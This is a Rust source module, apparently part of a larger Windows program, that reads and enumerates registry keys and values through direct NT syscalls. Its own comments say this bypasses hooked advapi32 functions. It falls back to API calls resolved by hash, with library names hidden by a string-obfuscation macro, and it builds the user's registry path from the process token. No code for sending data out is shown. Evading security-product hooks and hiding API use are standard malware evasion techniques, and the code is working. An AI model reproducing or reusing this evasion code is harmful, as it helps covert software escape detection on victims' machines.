//! Registry reads via NT syscalls (NtOpenKey / NtQueryValueKey /
//! NtEnumerateKey / NtEnumerateValueKey / NtClose), bypassing hooked
//! advapi32 stubs. Every public function falls back silently to the
//! hash-resolved Win32 path when the syscall layer is unavailable — SSN
//! resolution failure only; real NT errors (key/value not found) are
//! authoritative and never trigger the fallback.

use std::ffi::c_void;

use crate::resolve::{resolve, wide};
use crate::syscall::{self, NtOps, ObjectAttributes, UnicodeString};

pub const HKEY_LOCAL_MACHINE: usize = 0x8000_0002;
pub const HKEY_CURRENT_USER: usize = 0x8000_0001;

const RRF_RT_ANY: u32 = 0x0000_ffff;
const KEY_READ: u32 = 0x20019;
const TOKEN_QUERY: u32 = 0x8;
const TOKEN_USER: u32 = 1;
const KEY_BASIC_INFORMATION: u32 = 0;
const KEY_VALUE_FULL_INFORMATION: u32 = 1;
const KEY_VALUE_PARTIAL_INFORMATION: u32 = 2;
const STATUS_BUFFER_TOO_SMALL: i32 = 0xC000_0023u32 as i32;
const STATUS_NO_MORE_ENTRIES: i32 = 0x8000_001Au32 as i32;
/// Current-process pseudo handle.
const CURRENT_PROCESS: usize = usize::MAX;
const QUERY_BUF_MAX: u32 = 16 * 1024 * 1024;

/// Result of an NT-layer attempt: None = syscall layer unavailable for this
/// operation (use the Win32 path); Some(x) = authoritative result, where x
/// itself may encode "not found".
type Attempt<T> = Option<T>;

// ---------------------------------------------------------------------------
// NT path construction
// ---------------------------------------------------------------------------

/// HKCU's NT namespace prefix `\Registry\User\S-1-5-...`, derived once from
/// the process token (no advapi32 involvement).
static mut HKCU_PREFIX: Option<String> = None;
/// 0 = untried, 1 = ready, 2 = unavailable.
static mut HKCU_STATE: u8 = 0;

fn hkcu_prefix(nt: &NtOps) -> Option<&'static str> {
    unsafe {
        if HKCU_STATE == 0 {
            let p = std::ptr::addr_of_mut!(HKCU_PREFIX);
            *p = resolve_hkcu_prefix(nt);
            HKCU_STATE = if (*p).is_some() { 1 } else { 2 };
        }
        (*std::ptr::addr_of!(HKCU_PREFIX)).as_deref()
    }
}

unsafe fn resolve_hkcu_prefix(nt: &NtOps) -> Option<String> {
    let mut token = 0usize;
    if nt.open_process_token(CURRENT_PROCESS, TOKEN_QUERY, &mut token) < 0 || token == 0 {
        return None;
    }
    let mut buf = [0u8; 256];
    let mut ret_len = 0u32;
    let status = nt.query_information_token(
        token,
        TOKEN_USER,
        buf.as_mut_ptr() as *mut c_void,
        buf.len() as u32,
        &mut ret_len,
    );
    nt.close(token);
    if status < 0 || ret_len < 16 {
        return None;
    }
    // TOKEN_USER { SID_AND_ATTRIBUTES { Sid, Attributes } }
    let sid = *(buf.as_ptr() as *const usize) as *const u8;
    sid_to_string(sid).map(|s| format!(r"\Registry\User\{s}"))
}

/// "S-<rev>-<authority>-<sub1>-..." straight from the SID bytes.
unsafe fn sid_to_string(sid: *const u8) -> Option<String> {
    if sid.is_null() {
        return None;
    }
    let rev = *sid;
    let count = *sid.add(1) as usize;
    if count == 0 || count > 15 {
        return None;
    }
    let mut authority: u64 = 0;
    for i in 0..6 {
        authority = (authority << 8) | *sid.add(2 + i) as u64;
    }
    let mut out = format!("S-{rev}-{authority}");
    for i in 0..count {
        let b = 8 + i * 4;
        let sub = u32::from_le_bytes([*sid.add(b), *sid.add(b + 1), *sid.add(b + 2), *sid.add(b + 3)]);
        out.push('-');
        out.push_str(&sub.to_string());
    }
    Some(out)
}

fn nt_key_path(nt: &NtOps, hkey: usize, subkey: &str) -> Attempt<String> {
    match hkey {
        HKEY_LOCAL_MACHINE => Some(format!(r"\Registry\Machine\{subkey}")),
        HKEY_CURRENT_USER => hkcu_prefix(nt).map(|p| format!(r"{p}\{subkey}")),
        _ => None,
    }
}

/// Open a key read-only. Some(0) = could not open (authoritative).
unsafe fn nt_open_key(nt: &NtOps, hkey: usize, subkey: &str) -> Attempt<usize> {
    let path = nt_key_path(nt, hkey, subkey)?;
    let mut units: Vec<u16> = path.encode_utf16().collect();
    units.push(0);
    let name = UnicodeString::new(&units[..units.len() - 1]);
    let oa = ObjectAttributes::new(&name);
    let mut h = 0usize;
    if nt.open_key(&mut h, KEY_READ, &oa) < 0 || h == 0 {
        return Some(0);
    }
    Some(h)
}

// ---------------------------------------------------------------------------
// NT-layer reads
// ---------------------------------------------------------------------------

/// Read one value: Some(None) = value not found, Some(Some((type, data))).
unsafe fn nt_query_value(
    nt: &NtOps,
    hkey: usize,
    subkey: &str,
    value: &str,
) -> Attempt<Option<(u32, Vec<u8>)>> {
    let h = nt_open_key(nt, hkey, subkey)?;
    if h == 0 {
        return Some(None);
    }
    let mut vunits: Vec<u16> = value.encode_utf16().collect();
    vunits.push(0);
    let vname = UnicodeString::new(&vunits[..vunits.len() - 1]);
    let mut buf = vec![0u8; 4096];
    let mut ret_len = 0u32;
    let mut status = nt.query_value_key(
        h,
        &vname,
        KEY_VALUE_PARTIAL_INFORMATION,
        buf.as_mut_ptr() as *mut c_void,
        buf.len() as u32,
        &mut ret_len,
    );
    if status == STATUS_BUFFER_TOO_SMALL && ret_len > 4096 && ret_len <= QUERY_BUF_MAX {
        buf.resize(ret_len as usize, 0);
        status = nt.query_value_key(
            h,
            &vname,
            KEY_VALUE_PARTIAL_INFORMATION,
            buf.as_mut_ptr() as *mut c_void,
            buf.len() as u32,
            &mut ret_len,
        );
    }
    nt.close(h);
    if status < 0 {
        return Some(None);
    }
    // KEY_VALUE_PARTIAL_INFORMATION { TitleIndex, Type, DataLength, Data[] }
    let avail = (ret_len as usize).min(buf.len());
    if avail < 12 {
        return Some(None);
    }
    let typ = u32::from_le_bytes(buf[4..8].try_into().ok()?);
    let data_len = (u32::from_le_bytes(buf[8..12].try_into().ok()?) as usize).min(avail - 12);
    Some(Some((typ, buf[12..12 + data_len].to_vec())))
}

unsafe fn nt_enum_subkeys(nt: &NtOps, hkey: usize, subkey: &str) -> Attempt<Vec<String>> {
    let h = nt_open_key(nt, hkey, subkey)?;
    if h == 0 {
        return Some(Vec::new());
    }
    let mut out = Vec::new();
    let mut buf = vec![0u8; 1024];
    for i in 0..1024u32 {
        let mut ret_len = 0u32;
        let status = nt.enumerate_key(
            h,
            i,
            KEY_BASIC_INFORMATION,
            buf.as_mut_ptr() as *mut c_void,
            buf.len() as u32,
            &mut ret_len,
        );
        if status == STATUS_NO_MORE_ENTRIES || status < 0 {
            break;
        }
        // KEY_BASIC_INFORMATION { LastWriteTime i64, TitleIndex, NameLength, Name[] }
        let avail = (ret_len as usize).min(buf.len());
        if avail < 16 {
            break;
        }
        let Some(name_len) = buf[12..16].try_into().ok().map(u32::from_le_bytes) else {
            break;
        };
        let n = (name_len as usize).min(avail - 16) / 2;
        let units = std::slice::from_raw_parts(buf.as_ptr().add(16) as *const u16, n);
        out.push(String::from_utf16_lossy(units));
    }
    nt.close(h);
    Some(out)
}

unsafe fn nt_enum_values(
    nt: &NtOps,
    hkey: usize,
    subkey: &str,
) -> Attempt<Vec<(String, u32, Vec<u8>)>> {
    let h = nt_open_key(nt, hkey, subkey)?;
    if h == 0 {
        return Some(Vec::new());
    }
    let mut out = Vec::new();
    // Same 64KB data cap as the old RegEnumValueW path, plus header+name room.
    let mut buf = vec![0u8; 68 * 1024];
    for i in 0..256u32 {
        let mut ret_len = 0u32;
        let status = nt.enumerate_value_key(
            h,
            i,
            KEY_VALUE_FULL_INFORMATION,
            buf.as_mut_ptr() as *mut c_void,
            buf.len() as u32,
            &mut ret_len,
        );
        if status == STATUS_NO_MORE_ENTRIES || status < 0 {
            break;
        }
        // KEY_VALUE_FULL_INFORMATION { TitleIndex, Type, DataOffset,
        //   DataLength, NameLength, Name[] }
        let avail = (ret_len as usize).min(buf.len());
        if avail < 20 {
            break;
        }
        let (Some(typ), Some(data_off), Some(data_len), Some(name_len)) = (
            buf[4..8].try_into().ok().map(u32::from_le_bytes),
            buf[8..12].try_into().ok().map(u32::from_le_bytes),
            buf[12..16].try_into().ok().map(u32::from_le_bytes),
            buf[16..20].try_into().ok().map(u32::from_le_bytes),
        ) else {
            break;
        };
        let name_units = (name_len as usize).min(avail - 20) / 2;
        let name = String::from_utf16_lossy(std::slice::from_raw_parts(
            buf.as_ptr().add(20) as *const u16,
            name_units,
        ));
        let off = data_off as usize;
        if off > avail {
            continue;
        }
        let len = (data_len as usize).min(avail - off);
        out.push((name, typ, buf[off..off + len].to_vec()));
    }
    nt.close(h);
    Some(out)
}

// ---------------------------------------------------------------------------
// Win32 fallbacks (hash-resolved advapi32, same as before this layer existed)
// ---------------------------------------------------------------------------

type FnRegGetValueW = unsafe extern "system" fn(
    hkey: usize,
    subkey: *const u16,
    value: *const u16,
    flags: u32,
    pdwtype: *mut u32,
    data: *mut u8,
    cbdata: *mut u32,
) -> i32;
type FnRegOpenKeyExW = unsafe extern "system" fn(
    hkey: usize,
    subkey: *const u16,
    opts: u32,
    access: u32,
    out: *mut usize,
) -> i32;
type FnRegCloseKey = unsafe extern "system" fn(hkey: usize) -> i32;
type FnRegEnumKeyExW = unsafe extern "system" fn(
    hkey: usize,
    index: u32,
    name: *mut u16,
    name_len: *mut u32,
    reserved: *mut u32,
    class: *mut u16,
    class_len: *mut u32,
    last_write: *mut u64,
) -> i32;
type FnRegEnumValueW = unsafe extern "system" fn(
    hkey: usize,
    index: u32,
    name: *mut u16,
    name_len: *mut u32,
    reserved: *mut u32,
    typ: *mut u32,
    data: *mut u8,
    data_len: *mut u32,
) -> i32;

fn win32_read_string(hkey: usize, subkey: &str, value: &str) -> Option<String> {
    unsafe {
        let f: FnRegGetValueW =
            std::mem::transmute(resolve(&crate::obf!("advapi32.dll"), crate::api!("RegGetValueW")));
        if f as usize == 0 {
            return None;
        }
        let mut buf = vec![0u8; 2048];
        let mut len = buf.len() as u32;
        let status = f(
            hkey,
            wide(subkey).as_ptr(),
            wide(value).as_ptr(),
            RRF_RT_ANY,
            std::ptr::null_mut(),
            buf.as_mut_ptr(),
            &mut len,
        );
        if status != 0 || len < 2 {
            return None;
        }
        let u16s = std::slice::from_raw_parts(buf.as_ptr() as *const u16, (len as usize) / 2);
        let end = u16s.iter().position(|&c| c == 0).unwrap_or(u16s.len());
        let s = String::from_utf16_lossy(&u16s[..end]).trim().to_string();
        if s.is_empty() {
            None
        } else {
            Some(s)
        }
    }
}

fn win32_open(hkey: usize, subkey: &str) -> Option<usize> {
    unsafe {
        let open: FnRegOpenKeyExW =
            std::mem::transmute(resolve(&crate::obf!("advapi32.dll"), crate::api!("RegOpenKeyExW")));
        if open as usize == 0 {
            return None;
        }
        let mut out = 0usize;
        if open(hkey, wide(subkey).as_ptr(), 0, KEY_READ, &mut out) != 0 || out == 0 {
            return None;
        }
        Some(out)
    }
}

fn win32_close(h: usize) {
    unsafe {
        let close: FnRegCloseKey =
            std::mem::transmute(resolve(&crate::obf!("advapi32.dll"), crate::api!("RegCloseKey")));
        if close as usize != 0 {
            close(h);
        }
    }
}

fn win32_enum_subkeys(hkey: usize, subkey: &str) -> Vec<String> {
    let mut out = Vec::new();
    unsafe {
        let Some(h) = win32_open(hkey, subkey) else {
            return out;
        };
        let enumk: FnRegEnumKeyExW =
            std::mem::transmute(resolve(&crate::obf!("advapi32.dll"), crate::api!("RegEnumKeyExW")));
        if enumk as usize != 0 {
            for i in 0..1024u32 {
                let mut buf = [0u16; 256];
                let mut len = 256u32;
                let r = enumk(
                    h,
                    i,
                    buf.as_mut_ptr(),
                    &mut len,
                    std::ptr::null_mut(),
                    std::ptr::null_mut(),
                    std::ptr::null_mut(),
                    std::ptr::null_mut(),
                );
                if r != 0 {
                    break;
                }
                out.push(String::from_utf16_lossy(&buf[..len as usize]));
            }
        }
        win32_close(h);
    }
    out
}

fn win32_enum_values(hkey: usize, subkey: &str) -> Vec<(String, u32, Vec<u8>)> {
    let mut out = Vec::new();
    unsafe {
        let Some(h) = win32_open(hkey, subkey) else {
            return out;
        };
        let enumv: FnRegEnumValueW =
            std::mem::transmute(resolve(&crate::obf!("advapi32.dll"), crate::api!("RegEnumValueW")));
        if enumv as usize != 0 {
            for i in 0..256u32 {
                let mut name = [0u16; 256];
                let mut name_len = 256u32;
                let mut typ = 0u32;
                let mut data = vec![0u8; 64 * 1024];
                let mut data_len = data.len() as u32;
                let r = enumv(
                    h,
                    i,
                    name.as_mut_ptr(),
                    &mut name_len,
                    std::ptr::null_mut(),
                    &mut typ,
                    data.as_mut_ptr(),
                    &mut data_len,
                );
                if r != 0 {
                    break;
                }
                data.truncate(data_len as usize);
                out.push((String::from_utf16_lossy(&name[..name_len as usize]), typ, data));
            }
        }
        win32_close(h);
    }
    out
}

// ---------------------------------------------------------------------------
// Public API (NT first, silent Win32 fallback)
// ---------------------------------------------------------------------------

/// Expand `%VAR%` references, matching what RegGetValueW does for
/// REG_EXPAND_SZ values (process environment via std::env).
fn expand_env(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut rest = s;
    while let Some(start) = rest.find('%') {
        out.push_str(&rest[..start]);
        let after = &rest[start + 1..];
        match after.find('%') {
            Some(end) if end > 0 => {
                let name = &after[..end];
                match std::env::var(name) {
                    Ok(v) => out.push_str(&v),
                    Err(_) => {
                        out.push('%');
                        out.push_str(name);
                        out.push('%');
                    }
                }
                rest = &after[end + 1..];
            }
            _ => {
                out.push_str(&rest[start..]);
                return out;
            }
        }
    }
    out.push_str(rest);
    out
}

/// REG_SZ / REG_EXPAND_SZ / REG_MULTI_SZ -> trimmed string. REG_EXPAND_SZ is
/// expanded to match the old RegGetValueW (no RRF_NOEXPAND) behavior.
fn value_to_string(typ: u32, data: &[u8]) -> Option<String> {
    if !matches!(typ, 1 | 2 | 7) || data.len() < 2 {
        return None;
    }
    let units: Vec<u16> = data
        .chunks_exact(2)
        .map(|c| u16::from_le_bytes([c[0], c[1]]))
        .collect();
    let end = units.iter().position(|&c| c == 0).unwrap_or(units.len());
    let s = String::from_utf16_lossy(&units[..end]).trim().to_string();
    if s.is_empty() {
        return None;
    }
    if typ == 2 {
        Some(expand_env(&s))
    } else {
        Some(s)
    }
}

/// Read a UTF-16 string value (REG_SZ/EXPAND/MULTI). None if missing,
/// unreadable, or not a string type.
pub fn read_string(hkey: usize, subkey: &str, value: &str) -> Option<String> {
    if let Some(nt) = syscall::nt_ops() {
        if let Some(res) = unsafe { nt_query_value(&nt, hkey, subkey, value) } {
            return res.and_then(|(typ, data)| value_to_string(typ, &data));
        }
    }
    win32_read_string(hkey, subkey, value)
}

/// Subkey names of `hkey\subkey` (empty vec if the key is absent).
pub fn enum_subkeys(hkey: usize, subkey: &str) -> Vec<String> {
    if let Some(nt) = syscall::nt_ops() {
        if let Some(res) = unsafe { nt_enum_subkeys(&nt, hkey, subkey) } {
            return res;
        }
    }
    win32_enum_subkeys(hkey, subkey)
}

/// Values of `hkey\subkey` as (name, REG_ type, raw data <=64KB).
pub fn enum_values(hkey: usize, subkey: &str) -> Vec<(String, u32, Vec<u8>)> {
    if let Some(nt) = syscall::nt_ops() {
        if let Some(res) = unsafe { nt_enum_values(&nt, hkey, subkey) } {
            return res;
        }
    }
    win32_enum_values(hkey, subkey)
}
